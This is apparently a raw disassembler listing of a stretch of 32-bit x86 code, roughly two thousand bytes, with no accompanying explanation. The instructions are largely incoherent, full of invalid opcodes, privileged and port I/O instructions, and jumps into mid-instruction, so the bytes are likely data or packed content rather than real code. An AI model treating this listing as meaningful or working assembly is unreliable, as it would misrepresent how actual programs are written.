  41a180:	mov    esi,0x88c1949d
  41a185:	or     eax,0xf3366359
  41a18a:	sar    DWORD PTR [edi+0x7548c511],1
  41a190:	jmp    0x4aabd080
  41a195:	imul   esi,esp,0x77ec965d
  41a19b:	xchg   ebp,eax
  41a19c:	shl    BYTE PTR [edx+0x102a6a1c],0x92
  41a1a3:	pop    es
  41a1a4:	fst    DWORD PTR [eax]
  41a1a6:	sub    al,BYTE PTR [edx+0x300f9b7]
  41a1ac:	and    bl,BYTE PTR [eax]
  41a1ae:	push   ss
  41a1af:	ja     0x41a1c9
  41a1b1:	ins    BYTE PTR es:[edi],dx
  41a1b2:	mov    ebp,0x49bd0764
  41a1b7:	jne    0x41a1b2
  41a1b9:	push   ebx
  41a1ba:	jge    0x41a187
  41a1bc:	test   al,0x94
  41a1be:	test   BYTE PTR [esi],al
  41a1c0:	sbb    BYTE PTR [esi+0x3],dl
  41a1c3:	ret    0x4a80
  41a1c6:	inc    BYTE PTR [ecx-0x7e7035d7]
  41a1cc:	push   edx
  41a1cd:	inc    ebx
  41a1ce:	mov    ah,0x57
  41a1d0:	and    al,ch
  41a1d2:	mov    ds:0x14baccb8,eax
  41a1d7:	test   al,0xff
  41a1d9:	pop    es
  41a1da:	cwde   
  41a1db:	test   al,0x85
  41a1dd:	push   esi
  41a1de:	mov    eax,0xb6027245
  41a1e3:	sti    
  41a1e4:	mov    al,ds:0xba4ce032
  41a1e9:	sbb    esp,DWORD PTR [ecx]
  41a1eb:	dec    esp
  41a1ec:	aam    0x9
  41a1ee:	aam    0x14
  41a1f0:	push   ebx
  41a1f1:	mov    ds:0x640e466,al
  41a1f6:	fldenv [ebx]
  41a1f8:	call   0x88318a19
  41a1fd:	mov    ebp,0x2cb17d39
  41a202:	mov    edx,0x1c7f1c0f
  41a207:	mov    ds:0xc641127e,al
  41a20c:	push   es
  41a20d:	in     al,0x2e
  41a20f:	mov    edx,0xe4497f0e
  41a214:	dec    BYTE PTR [esi]
  41a216:	cmp    DWORD PTR [eax+0x3680e419],edx
  41a21c:	das    
  41a21d:	mov    edx,0x64659e1d
  41a222:	inc    eax
  41a223:	sbb    esp,0x15d91fec
  41a229:	loopne 0x41a26b
  41a22b:	fmul   QWORD PTR [ecx+edx*8-0x261bf77e]
  41a232:	cs jns 0x41a215
  41a235:	mov    eax,0xfc2cd484
  41a23a:	and    BYTE PTR [eax-0x2bf1a6f9],dl
  41a240:	fcomp  st(0)
  41a242:	mov    eax,0x80c8db88
  41a247:	std    
  41a248:	mov    cl,0x3a
  41a24a:	mov    edx,0xd08c6c1e
  41a24f:	aas    
  41a250:	adc    al,0x4b
  41a252:	adc    BYTE PTR ds:[edx-0x2fccd757],bl
  41a259:	mov    eax,0x7903e490
  41a25e:	mov    dh,0xcc
  41a260:	and    DWORD PTR [eax],esp
  41a262:	sub    esp,ecx
  41a264:	mov    eax,0x16290d94
  41a269:	mov    al,0xb9
  41a26b:	ret    0x81c8
  41a26e:	or     al,0xb2
  41a270:	test   eax,0x54d9c825
  41a276:	mov    eax,0x2c157822
  41a27b:	test   eax,0x3b0db20
  41a280:	cmp    BYTE PTR [esi],cl
  41a282:	les    ebp,FWORD PTR ds:[edi+edx*4+0x1c]
  41a287:	enter  0xc423,0x3f
  41a28b:	popa   
  41a28c:	ror    BYTE PTR [ecx],0x19
  41a28f:	nop
  41a290:	add    DWORD PTR ds:0x90d0c010,0xf
  41a297:	in     al,0xf4
  41a299:	mov    edx,0x54baf844
  41a29e:	outs   dx,BYTE PTR ds:[esi]
  41a29f:	out    dx,al
  41a2a0:	or     eax,0xfcdf79a8
  41a2a5:	push   0xf4070f64
  41a2aa:	mov    eax,0x61583b
  41a2af:	xchg   ecx,eax
  41a2b0:	stos   BYTE PTR es:[edi],al
  41a2b1:	das    
  41a2b2:	inc    esp
  41a2b3:	sbb    al,0x90
  41a2b5:	nop
  41a2b6:	inc    ecx
  41a2b7:	push   es
  41a2b8:	jo     0x41a256
  41a2ba:	or     ebx,DWORD PTR [ebx+eax*1]
  41a2bd:	sar    al,cl
  41a2bf:	or     al,0x46
  41a2c1:	add    esi,0xf372423
  41a2c7:	shr    BYTE PTR [eax-0x9ef4540],cl
  41a2cd:	retf   
  41a2ce:	nop
  41a2cf:	adc    DWORD PTR [eax],esi
  41a2d1:	dec    edi
  41a2d2:	push   es
  41a2d3:	ins    DWORD PTR es:[edi],dx
  41a2d4:	ja     0x41a335
  41a2d6:	mov    al,0xe2
  41a2d8:	das    
  41a2d9:	fs das 
  41a2db:	xlat   BYTE PTR ds:[ebx]
  41a2dc:	push   edi
  41a2dd:	ins    DWORD PTR es:[edi],dx
  41a2de:	add    BYTE PTR [eax],ah
  41a2e0:	fs sub al,0xd9
  41a2e3:	gs inc eax
  41a2e5:	mov    al,ds:0x61020320
  41a2ea:	ins    DWORD PTR es:[edi],dx
  41a2eb:	or     eax,DWORD PTR [edi]
  41a2ed:	in     al,dx
  41a2ee:	or     esi,DWORD PTR [edx+0x70]
  41a2f1:	dec    ebx
  41a2f2:	push   0x53686823
  41a2f7:	xor    BYTE PTR [ecx+0x1],cl
  41a2fa:	and    DWORD PTR [eax],0xfffffffc
  41a2fd:	and    eax,0xfb2df00
  41a302:	push   cs
  41a303:	and    BYTE PTR [ebx-0x253688ac],dl
  41a309:	cmp    ah,BYTE PTR [esi-0x7d]
  41a30c:	or     edi,DWORD PTR [edx]
  41a30e:	jae    0x41a383
  41a310:	mov    dh,0x80
  41a312:	mov    esi,0xe0bbaffa
  41a317:	mov    ah,0xf4
  41a319:	inc    BYTE PTR [ebx]
  41a31b:	sub    dl,BYTE PTR [ebx]
  41a31d:	add    eax,0xd424640f
  41a322:	or     ebp,DWORD PTR [eax+0x4d0ab5bd]
  41a328:	cmp    eax,0x307419e1
  41a32d:	in     eax,0x4f
  41a32f:	push   0x94434bdc
  41a334:	pop    eax
  41a335:	mov    eax,0xfc1f55ed
  41a33a:	in     al,dx
  41a33b:	rdtsc  
  41a33d:	imul   ch
  41a33f:	popf   
  41a340:	cli    
  41a341:	pushf  
  41a342:	mov    ds:0x52af128,eax
  41a347:	or     bh,BYTE PTR cs:[eax+0x90767d0]
  41a34e:	add    al,0xa0
  41a350:	mov    cl,0x12
  41a352:	pop    ebx
  41a353:	repz inc eax
  41a355:	scas   eax,DWORD PTR es:[edi]
  41a356:	(bad)  
  41a357:	inc    DWORD PTR [ecx+ebp*2+0x73]
  41a35b:	imul   eax,DWORD PTR [esi+0x72],0x65
  41a35f:	gs push ebx
  41a361:	jo     0x41a3c4
  41a363:	arpl   WORD PTR [ebp+0x45],sp
  41a366:	js     0x41a368
  41a368:	add    edx,DWORD PTR [ecx-0x4889d726]
  41a36e:	ret    0xffe5
  41a371:	mov    edx,0x1e27baa6
  41a376:	fcom   DWORD PTR [edi+0x7d0bb7c]
  41a37c:	sub    al,0xd3
  41a37e:	xor    eax,0x2bc86980
  41a383:	rcl    BYTE PTR [edi],0x9c
  41a386:	pop    ebp
  41a387:	shl    DWORD PTR [ecx*2-0x1f4f4f48],cl
  41a38e:	test   al,0xf
  41a390:	and    BYTE PTR ds:0xa034d34d,dh
  41a396:	ins    BYTE PTR es:[edi],dx
  41a397:	cwde   
  41a398:	xor    al,0x90
  41a39a:	shl    DWORD PTR [ecx*2-0x77b7f82d],cl
  41a3a1:	add    al,0x80
  41a3a3:	or     al,0x4d
  41a3a5:	shl    DWORD PTR [ebx*2+0x70d81f78],cl
  41a3ac:	or     BYTE PTR [eax+0x0],ch
  41a3af:	call   0x7060:0xf59669a6
  41a3b6:	pop    eax
  41a3b7:	pop    esp
  41a3b8:	push   eax
  41a3b9:	shl    DWORD PTR ds:0x4817775d,cl
  41a3bf:	(bad)  
  41a3c1:	inc    eax
  41a3c2:	pop    es
  41a3c3:	sbb    BYTE PTR [ebp-0x2d],cl
  41a3c6:	xor    eax,0x30dc384d
  41a3cb:	ja     0x41a3b1
  41a3cd:	sub    ah,dl
  41a3cf:	imul   edi,DWORD PTR [edx-0x68dfca12],0x7
  41a3d6:	sbb    BYTE PTR [edi],dl
  41a3d8:	pop    eax
  41a3d9:	adc    BYTE PTR [edi],al
  41a3db:	(bad)  [ebx-0x46]
  41a3de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3df:	cwde   
  41a3e0:	or     BYTE PTR [edi],dl
  41a3e2:	je     0x41a3e4
  41a3e4:	daa    
  41a3e5:	aaa    
  41a3e6:	clc    
  41a3e7:	xor    al,0x5d
  41a3e9:	ja     0x41a381
  41a3eb:	icebp  
  41a3ec:	adc    al,0xeb
  41a3ee:	lock or ecx,esp
  41a3f1:	add    BYTE PTR [ebx-0x132c9b19],dl
  41a3f7:	xchg   esp,eax
  41a3f8:	repz call 0x277627f2
  41a3fe:	mov    ebx,0xf38023e4
  41a403:	loopne 0x41a3c1
  41a405:	fadd   QWORD PTR [esi]
  41a407:	imul   ecx,DWORD PTR [esi+0x36],0x9cd8f3b4
  41a40e:	aam    0x39
  41a410:	fstp   DWORD PTR [esp+ebp*2+0x6cd0f410]
  41a417:	hlt    
  41a418:	int3   
  41a419:	sbb    DWORD PTR [ecx+ebx*1+0x54c8b8a4],esp
  41a420:	les    esi,FWORD PTR [ebx-0x4e]
  41a423:	sbb    DWORD PTR [esp+ebp*4-0x430b5b40],esp
  41a42a:	xor    ecx,DWORD PTR [eax+0x33]
  41a42d:	dec    eax
  41a42e:	je     0x41a3e8
  41a430:	add    BYTE PTR [ebp+ecx*8-0x139b1937],dh
  41a437:	repz mov al,0x7c
  41a43a:	rep lods al,BYTE PTR ds:[esi]
  41a43c:	mov    al,ds:0x20cd939a
  41a441:	test   al,0x3c
  41a443:	hlt    
  41a444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a445:	in     al,0x9a
  41a447:	inc    ecx
  41a448:	call   0x3664:0x9c30a041
  41a44f:	daa    
  41a450:	fwait
  41a451:	inc    ecx
  41a452:	cwde   
  41a453:	cmp    ah,dh
  41a455:	xchg   esp,eax
  41a456:	hlt    
  41a457:	repz call 0xf378:0x9072cd93
  41a45f:	mov    WORD PTR [eax],gs
  41a461:	ja     0x41a467
  41a463:	add    BYTE PTR [ecx-0x78],0x58
  41a467:	fnsave [ecx]
  41a469:	mov    edi,0x4d20cd20
  41a46e:	test   al,cl
  41a470:	adc    BYTE PTR [eax+0x27],0x9b
  41a474:	xchg   ebx,eax
  41a475:	int    0x7c
  41a477:	shl    bl,1
  41a479:	js     0x41a3ff
  41a47b:	repz je 0x41a41a
  41a47e:	ins    BYTE PTR es:[edi],dx
  41a47f:	dec    esi
  41a480:	ss shl ah,0x70
  41a484:	adc    ch,dh
  41a486:	ins    BYTE PTR es:[edi],dx
  41a487:	out    0x64,eax
  41a489:	jae    0x41a481
  41a48b:	repz inc edi
  41a48d:	push   0xcf64f368
  41a492:	and    ch,cl
  41a494:	pusha  
  41a495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a496:	pusha  
  41a497:	dec    esp
  41a498:	pop    esp
  41a499:	hlt    
  41a49a:	imul   ecx,DWORD PTR [esi+0x36],0x1c383b67
  41a4a1:	hlt    
  41a4a2:	xor    al,0xd8
  41a4a4:	xchg   edx,eax
  41a4a5:	daa    
  41a4a6:	push   eax
  41a4a7:	add    al,0xd7
  41a4a9:	push   ebp
  41a4aa:	scas   al,BYTE PTR es:[edi]
  41a4ab:	push   ss
  41a4ac:	xor    ch,bh
  41a4ae:	bound  ecx,QWORD PTR [eax-0x2eb57adf]
  41a4b4:	push   esp
  41a4b5:	pop    es
  41a4b6:	pop    ss
  41a4b7:	fistp  QWORD PTR [edi+eax*2-0x67]
  41a4bb:	cld    
  41a4bc:	add    al,0x74
  41a4be:	(bad)  
  41a4bf:	in     al,0xb8
  41a4c1:	sub    al,0xf2
  41a4c3:	sub    edi,ebx
  41a4c5:	or     ecx,DWORD PTR [si+0x16]
  41a4c9:	add    bl,BYTE PTR [eax-0xb4717cd]
  41a4cf:	icebp  
  41a4d0:	adc    al,0xe4
  41a4d2:	cdq    
  41a4d3:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41a4d5:	pop    es
  41a4d6:	cmp    BYTE PTR [edx+eax*1],ch
  41a4d9:	sbb    al,0x38
  41a4db:	sbb    al,0x72
  41a4dd:	add    BYTE PTR [eax],dl
  41a4df:	and    al,0x18
  41a4e1:	xchg   edi,eax
  41a4e2:	dec    ecx
  41a4e3:	and    bh,BYTE PTR [eax]
  41a4e5:	adc    edx,ebx
  41a4e7:	aad    0x39
  41a4e9:	in     al,0x58
  41a4eb:	mov    DWORD PTR [eax],edx
  41a4ed:	loop   0x41a4fe
  41a4ef:	loopne 0x41a551
  41a4f1:	dec    eax
  41a4f2:	add    ebp,DWORD PTR [edx+eax*8-0x62]
  41a4f6:	push   ebx
  41a4f7:	ds sbb al,0x14
  41a4fa:	nop
  41a4fb:	xor    al,0xf
  41a4fd:	nop
  41a4fe:	add    al,dl
  41a500:	push   es
  41a501:	or     al,0x3b
  41a503:	xor    eax,DWORD PTR [edi]
  41a505:	enter  0x9ca0,0x92
  41a509:	cwde   
  41a50a:	or     DWORD PTR [edx+edx*4+0x49],esp
  41a50e:	es xchg esp,eax
  41a510:	nop
  41a511:	mov    BYTE PTR [ecx+ecx*2],al
  41a514:	es cdq 
  41a516:	test   BYTE PTR [eax-0x7a],bh
  41a519:	std    
  41a51a:	in     al,0xcc
  41a51c:	ins    BYTE PTR es:[edi],dx
  41a51d:	or     DWORD PTR [eax-0x4b475fcf],edi
  41a523:	adc    edx,DWORD PTR [edx]
  41a525:	repnz nop
  41a527:	sub    BYTE PTR [edi],ah
  41a529:	pop    esp
  41a52a:	scas   al,BYTE PTR es:[edi]
  41a52b:	call   FWORD PTR [esp+eiz*2-0x7c3780f0]
  41a532:	sub    eax,0xb8407301
  41a537:	adc    BYTE PTR [ebx+0xc],bl
  41a53a:	div    BYTE PTR [ecx-0x73d6c356]
  41a540:	mov    eax,0x65b409fc
  41a545:	pop    ebp
  41a546:	loopne 0x41a4d6
  41a548:	jo     0x41a4cc
  41a54a:	push   es
  41a54b:	xor    eax,0x35dcba46
  41a550:	cmp    eax,0xf3621e1b
  41a555:	cdq    
  41a556:	pusha  
  41a557:	test   al,0x8e
  41a559:	mov    al,fs:0xd9264240
  41a55f:	jb     0x41a4f6
  41a561:	cld    
  41a562:	iret   
  41a563:	push   es
  41a564:	adc    ch,ah
  41a566:	and    BYTE PTR [ebx+0x19177830],0x64
  41a56d:	mov    al,0xc9
  41a56f:	adc    al,BYTE PTR [edi]
  41a571:	pusha  
  41a572:	pop    esp
  41a573:	inc    edx
  41a574:	scas   eax,DWORD PTR es:[edi]
  41a575:	jle    0x41a58b
  41a577:	ja     0x41a5f6
  41a579:	adc    BYTE PTR [esi+0x39],al
  41a57c:	out    dx,al
  41a57d:	push   esi
  41a57e:	mov    al,0xe9
  41a580:	mov    eax,0x17ebe701
  41a585:	js     0x41a59f
  41a587:	push   eax
  41a588:	add    al,0x7d
  41a58a:	aaa    
  41a58b:	test   BYTE PTR [eax-0x619084ec],al
  41a591:	hlt    
  41a592:	pop    ebp
  41a593:	ret    0xcb14
  41a596:	dec    esp
  41a597:	adc    al,0x9b
  41a599:	das    
  41a59a:	adc    BYTE PTR es:[ebx],cl
  41a59d:	lds    esp,FWORD PTR [edx+0x4c0c9016]
  41a5a3:	ja     0x41a617
  41a5a5:	mov    dl,0xd
  41a5a7:	stc    
  41a5a8:	imul   BYTE PTR [esi-0x44f39b51]
  41a5ae:	pop    edx
  41a5af:	sbb    eax,0x65203006
  41a5b4:	cs aad 0x6
  41a5b7:	add    bl,BYTE PTR [edx+0x4140af9]
  41a5bd:	jmp    0xe3d63960
  41a5c2:	sbb    al,0x85
  41a5c4:	in     al,0x81
  41a5c6:	lods   eax,DWORD PTR ds:[esi]
  41a5c7:	mov    ch,0xaf
  41a5c9:	cld    
  41a5ca:	mov    dl,0x53
  41a5cc:	out    dx,eax
  41a5cd:	dec    eax
  41a5ce:	pop    ecx
  41a5cf:	push   0x79006b37
  41a5d4:	adc    BYTE PTR [edx+0x1a],dh
  41a5d7:	mov    al,0x65
  41a5d9:	test   al,0x11
  41a5db:	xor    al,BYTE PTR [edx+esi*2]
  41a5de:	and    DWORD PTR [eax+0xc81186],esi
  41a5e4:	jb     0x41a662
  41a5e6:	lea    eax,[ecx]
  41a5e8:	in     al,0x44
  41a5ea:	fdiv   st,st(2)
  41a5ec:	xlat   BYTE PTR ds:[ebx]
  41a5ed:	jge    0x41a5e7
  41a5ef:	inc    esp
  41a5f0:	enter  0x9023,0xf9
  41a5f4:	pop    esi
  41a5f5:	mov    cl,0x8c
  41a5f7:	xchg   edx,eax
  41a5f8:	add    ebx,eax
  41a5fa:	aam    0x6b
  41a5fc:	gs mov cl,0xdf
  41a5ff:	mov    eax,ds:0xa9e751c8
  41a604:	jno    0x41a5e3
  41a606:	pop    edi
  41a607:	mov    dl,0x1c
  41a609:	and    DWORD PTR ds:0x558df8f8,ebp
  41a60f:	fsubrp st(2),st
  41a611:	and    eax,0x56ff9b
  41a616:	cmp    BYTE PTR [ebp-0x6c],0xf5
  41a61a:	sbb    eax,eax
  41a61c:	xchg   edx,eax
  41a61d:	xchg   ecx,eax
  41a61e:	leave  
  41a61f:	out    dx,al
  41a620:	mov    ah,BYTE PTR [esi-0x77]
  41a623:	add    bh,BYTE PTR [esi-0x1c]
  41a626:	clc    
  41a627:	adc    BYTE PTR [ecx],bh
  41a629:	push   ss
  41a62a:	xchg   esi,eax
  41a62b:	jmp    0x41a60e
  41a62d:	dec    ebx
  41a62e:	jle    0x41a5d6
  41a630:	xor    BYTE PTR [ebx],cl
  41a632:	pushf  
  41a633:	test   BYTE PTR [eax-0x4e],dl
  41a636:	push   es
  41a637:	mov    edi,DWORD PTR [edx]
  41a639:	nop
  41a63a:	adc    BYTE PTR [ebx],bl
  41a63c:	cwde   
  41a63d:	cld    
  41a63e:	test   eax,0x306a8d73
  41a643:	dec    esi
  41a644:	cmp    DWORD PTR [edx],ecx
  41a646:	xor    dl,ah
  41a648:	imul   eax,DWORD PTR [esp+ebx*4+0x57f1db6c],0x900930b2
  41a653:	or     DWORD PTR [eax+edx*4+0x6f],ebp
  41a657:	rol    BYTE PTR [edi],0x20
  41a65a:	pop    ss
  41a65b:	enter  0xb875,0xc7
  41a65f:	adc    al,0x1a
  41a661:	inc    edx
  41a662:	js     0x41a684
  41a664:	xor    al,0xb3
  41a666:	fs pop ds
  41a668:	adc    BYTE PTR [eax+esi*2+0x108dc03],bh
  41a66f:	inc    esp
  41a670:	inc    eax
  41a671:	lea    ecx,[ebp-0x10]
  41a674:	dec    eax
  41a675:	(bad)  
  41a676:	mov    gs,ecx
  41a678:	push   esi
  41a679:	pushf  
  41a67a:	jae    0x41a690
  41a67c:	cmp    esi,DWORD PTR [ebx-0x7a8a4df4]
  41a682:	aad    0x90
  41a684:	arpl   WORD PTR [eax+0x54],bx
  41a687:	push   0xffffffc8
  41a689:	and    BYTE PTR [ebx+0x3b444c50],al
  41a68f:	add    bh,BYTE PTR [edx]
  41a691:	mov    ss,ebx
  41a693:	stc    
  41a694:	jns    0x41a692
  41a696:	pop    es
  41a697:	mov    BYTE PTR [ecx+0x2c],dl
  41a69a:	cmc    
  41a69b:	push   eax
  41a69c:	repnz cli 
  41a69e:	mov    ebx,0x6c51aaad
  41a6a3:	arpl   WORD PTR [edx],ax
  41a6a5:	sbb    eax,0xe8415bc2
  41a6aa:	arpl   WORD PTR [ecx+0x7b],dx
  41a6ad:	push   ecx
  41a6ae:	push   0x15eeb588
  41a6b3:	jo     0x41a672
  41a6b5:	inc    esp
  41a6b6:	or     DWORD PTR [ebp-0x46],edx
  41a6b9:	add    BYTE PTR [ecx],al
  41a6bb:	mov    ecx,0x9fc0cd9e
  41a6c0:	adc    ah,BYTE PTR [ebx-0x675ca6a0]
  41a6c6:	aas    
  41a6c7:	adc    eax,0xe4b9ac30
  41a6cc:	xchg   edx,eax
  41a6cd:	dec    ebx
  41a6ce:	pushf  
  41a6cf:	mov    ah,0xa0
  41a6d1:	cs mov ecx,0xbc3c19e4
  41a6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6d8:	les    edi,FWORD PTR [ecx-0x57b46d1c]
  41a6de:	int3   
  41a6df:	lods   al,BYTE PTR ds:[esi]
  41a6e0:	in     al,0x92
  41a6e2:	dec    ebx
  41a6e3:	cs aam 0xb0
  41a6e6:	fcom   QWORD PTR [edx-0x4b46d1b5]
  41a6ec:	in     al,0xb8
  41a6ee:	dec    ebx
  41a6ef:	cs mov ecx,0xf4bcece4
  41a6f5:	sbb    DWORD PTR [ecx-0x33f6d1c],edi
  41a6fb:	les    ecx,FWORD PTR [eax-0xe]
  41a6fe:	mov    WORD PTR [edx+esi*8+0x4],cs
  41a702:	mov    dh,0xc8
  41a704:	push   esp
  41a705:	or     al,0x5c
  41a707:	repnz mov WORD PTR [esp+ecx*8-0x40],ds
  41a70c:	sbb    al,0xd0
  41a70e:	inc    esi
  41a70f:	imul   ecx,DWORD PTR cs:[esi-0x2bd34fd4],0x2e473498
  41a71a:	jns    0x41a758
  41a71c:	fadd   DWORD PTR [ecx+esi*4]
  41a71f:	dec    esp
  41a720:	xchg   edi,eax
  41a721:	cmp    al,0x23
  41a723:	xchg   edi,eax
  41a724:	fdiv   QWORD PTR [eax+0x5c]
  41a727:	loopne 0x41a74c
  41a729:	xchg   edi,eax
  41a72a:	cmp    al,0x23
  41a72c:	lock ins BYTE PTR es:[edi],dx
  41a72e:	in     al,0x60
  41a730:	sahf   
  41a731:	xchg   ecx,eax
  41a732:	dec    ebx
  41a733:	call   0xfe8c:0xd0e87cb2
  41a73a:	inc    edx
  41a73b:	cwde   
  41a73c:	dec    ebx
  41a73d:	in     al,dx
  41a73e:	pop    ss
  41a73f:	outs   dx,DWORD PTR ds:[esi]
  41a740:	ins    BYTE PTR es:[edi],dx
  41a741:	gs popa 
  41a743:	jne    0x41a7b9
  41a745:	sahf   
  41a746:	inc    ecx
  41a747:	mov    cl,0xa4
  41a749:	stos   DWORD PTR es:[edi],eax
  41a74a:	cmp    eax,0xa99f6843
  41a74f:	fwait
  41a750:	sub    dh,BYTE PTR [ecx]
  41a752:	push   esp
  41a753:	jns    0x41a7c5
  41a755:	lods   al,BYTE PTR ds:[esi]
  41a756:	adc    ecx,DWORD PTR [esi-0x71]
  41a759:	cmp    al,0x72
  41a75b:	in     al,dx
  41a75c:	add    BYTE PTR gs:[bx],al
  41a760:	outs   dx,DWORD PTR ds:[esi]
  41a761:	je     0x41a7a4
  41a763:	fs fs push ebx
  41a766:	jne    0x41a7ca
  41a768:	cmp    esi,edx
  41a76a:	enter  0x4d23,0x75
  41a76e:	ins    BYTE PTR es:[edi],dx
  41a76f:	inc    esp
  41a770:	imul   esi,DWORD PTR [esi+0x49],0x93e40864
  41a777:	mov    bl,0x9f
  41a779:	pop    ss
  41a77a:	outs   dx,DWORD PTR ds:[esi]
  41a77b:	fs das 
  41a77d:	outs   dx,BYTE PTR ds:[esi]
  41a77e:	dec    edi
  41a77f:	jb     0x41a781
  41a781:	lods   eax,DWORD PTR ds:[esi]
  41a782:	dec    esi
  41a783:	push   ds
  41a784:	jns    0x41a7de
  41a786:	outs   dx,DWORD PTR ds:[esi]
  41a787:	jb     0x41a7cc
  41a789:	ins    DWORD PTR es:[edi],dx
  41a78a:	jo     0x41a7c0
  41a78c:	sbb    eax,0xf7be48e4
  41a791:	outs   dx,DWORD PTR ds:[esi]
  41a792:	ins    DWORD PTR es:[edi],dx
  41a793:	push   ebx
  41a794:	je     0x41a7b4
  41a796:	rsqrtps xmm7,XMMWORD PTR [eax]
  41a799:	mov    al,0x2f
  41a79b:	fldcw  WORD PTR [edi]
  41a79d:	inc    esp
  41a79e:	popa   
  41a79f:	je     0x41a806
  41a7a1:	adc    DWORD PTR [edi+0x79],eax
  41a7a4:	pop    ds
  41a7a5:	lahf   
  41a7a6:	mov    ebx,0x6f42bf25
  41a7ab:	outs   dx,DWORD PTR ds:[esi]
  41a7ac:	ins    BYTE PTR es:[edi],dx
  41a7ad:	(bad)  
  41a7af:	je     0x41a823
  41a7b1:	inc    ebx
  41a7b2:	jns    0x41a7eb
  41a7b4:	mov    al,0x97
  41a7b6:	nop
  41a7b7:	add    BYTE PTR [edi+0xf],al
  41a7ba:	aaa    
  41a7bb:	shl    BYTE PTR ds:0xc1bba10f,0xb6
  41a7c2:	lock mov cl,0xb0
  41a7c5:	cmp    BYTE PTR [eax+0x2],ah
  41a7c8:	enter  0x6bb6,0x2e
  41a7cc:	cmp    eax,0xf05a6c8c
  41a7d1:	add    eax,0xcc4b8c5a
  41a7d6:	add    DWORD PTR [edi-0x7e],0x60
  41a7da:	sub    DWORD PTR [edx+0x20ff62f8],edx
  41a7e0:	mov    edx,0xc62ed93
  41a7e5:	sub    eax,0xd809cccc
  41a7ea:	fld    QWORD PTR [ecx-0x16]
  41a7ed:	in     al,dx
  41a7ee:	adc    ah,BYTE PTR [edx+0x1f403e9]
  41a7f4:	adc    eax,0x2ddb06c0
  41a7f9:	dec    eax
  41a7fa:	test   DWORD PTR [esi-0x2],0x785f0817
  41a801:	mov    bh,0xd
  41a803:	or     al,BYTE PTR [esp+esi*8]
  41a806:	or     BYTE PTR [ebx+0x3],dh
  41a809:	add    BYTE PTR [edi+esi*4-0x7fb1234d],dh
  41a810:	jmp    0x41a7f6
  41a812:	fild   DWORD PTR [ebx]
  41a814:	call   0xd3b01cf5
  41a819:	xor    al,0x4d
  41a81b:	test   al,0x88
  41a81d:	les    esi,FWORD PTR [eax-0x1c]
  41a820:	fidivr DWORD PTR [ebx]
  41a822:	scas   eax,DWORD PTR es:[edi]
  41a823:	cmp    ebx,ecx
  41a825:	jne    0x41a846
  41a827:	test   al,0x3
  41a829:	cld    
  41a82a:	sub    bl,al
  41a82c:	adc    edi,DWORD PTR [edi+ebx*1+0x75de1428]
  41a833:	adc    esp,DWORD PTR [ebx+eax*1+0x12]
  41a837:	push   esp
  41a838:	inc    ebx
  41a839:	jne    0x41a862
  41a83b:	and    al,0x58
  41a83d:	xlat   BYTE PTR ds:[ebx]
  41a83e:	push   ds
  41a83f:	shl    DWORD PTR [ebx],0x1d
  41a842:	jmp    0x41a8bf
  41a844:	pop    es
  41a845:	sbb    BYTE PTR [esi],cl
  41a847:	idiv   ah
  41a849:	add    dh,BYTE PTR [ebx+0x15081060]
  41a84f:	jae    0x41a851
  41a851:	inc    esp
  41a852:	adc    al,ch
  41a854:	sysret 
  41a856:	inc    esp
  41a857:	mov    eax,0x7254ec77
  41a85c:	in     al,0x44
  41a85e:	mov    eax,0x45165f0c
  41a863:	pop    edx
  41a864:	sub    BYTE PTR [esi+0x42d21155],al
  41a86a:	xchg   BYTE PTR [edx+0x63a8db91],dh
  41a870:	test   al,0x8b
  41a872:	and    ah,BYTE PTR [eax+0x7]
  41a875:	adc    eax,0xbc3ed445
  41a87a:	enter  0xc2e,0x93
  41a87e:	or     al,0xb9
  41a880:	arpl   WORD PTR [ecx+edi*4],cx
  41a883:	shr    DWORD PTR [eax+0x21699008],0x43
  41a88a:	leave  
  41a88b:	pusha  
  41a88c:	arpl   WORD PTR [eax+0x70],si
  41a88f:	arpl   WORD PTR [edi],cx
  41a891:	or     DWORD PTR [ebx],eax
  41a893:	pop    ss
  41a894:	sub    eax,DWORD PTR [ecx+0x72]
  41a897:	addr16 gs aam 0x1f
  41a89b:	nop
  41a89c:	or     al,0x65
  41a89e:	arpl   sp,dx
  41a8a0:	inc    edx
  41a8a1:	popa   
  41a8a2:	fs dec eax
  41a8a4:	clc    
  41a8a5:	lds    esi,FWORD PTR [edx+0x9]
  41a8a8:	cmp    eax,0x2bba3863
  41a8ad:	fwait
  41a8ae:	or     edx,DWORD PTR [eax+0x63ba38bc]
  41a8b4:	retf   0xa164
  41a8b7:	ins    BYTE PTR es:[edi],dx
  41a8b8:	adc    BYTE PTR [edx],bl
  41a8ba:	sub    ebx,DWORD PTR [si-0x129d]
  41a8bf:	nop
  41a8c0:	adc    DWORD PTR [eax+0x5b41189c],0xd156f623
  41a8ca:	popa   
  41a8cb:	jns    0x41a8f2
  41a8cd:	imul   esp,DWORD PTR [ebp+0x64],0x66
  41a8d1:	mov    edi,0xb645e488
  41a8d6:	add    al,0xbb
  41a8d8:	addr16 add al,0xbb
  41a8db:	xchg   esp,eax
  41a8dc:	sbb    al,0xe6
  41a8de:	cli    
  41a8df:	inc    ebx
  41a8e0:	jb     0x41a947
  41a8e2:	mov    WORD PTR [edi+0x6c],fs
  41a8e5:	sbb    BYTE PTR [edx],dh
  41a8e7:	adc    BYTE PTR [edx],dh
  41a8e9:	ins    BYTE PTR es:[edi],dx
  41a8ea:	adc    al,0xe4
  41a8ec:	mov    al,0x5
  41a8ee:	sbb    bh,BYTE PTR [ebp-0x34938fb7]
  41a8f4:	rol    BYTE PTR [ecx+0x3],1
  41a8f7:	xchg   edx,eax
  41a8f8:	mov    eax,ds:0x6c3c64d0
  41a8fd:	dec    ecx
  41a8fe:	xchg   BYTE PTR [edi+0x38],ah
  41a901:	mov    esp,0x48070a63
  41a906:	pop    esi
  41a907:	cmp    BYTE PTR [ebp+edx*2+0x3650fb6e],bh
  41a90e:	or     BYTE PTR [edi],dh
  41a910:	pop    edi
  41a911:	arpl   WORD PTR [edx+ebx*4-0x64],si
  41a915:	arpl   WORD PTR [ebx],sp
  41a917:	push   edx
  41a918:	popa   
  41a919:	mov    esp,0x84b5631f
  41a91e:	xor    BYTE PTR [ecx+0x61],0x70
  41a922:	xchg   ebx,eax
  41a923:	arpl   WORD PTR [eax+0x63],bp
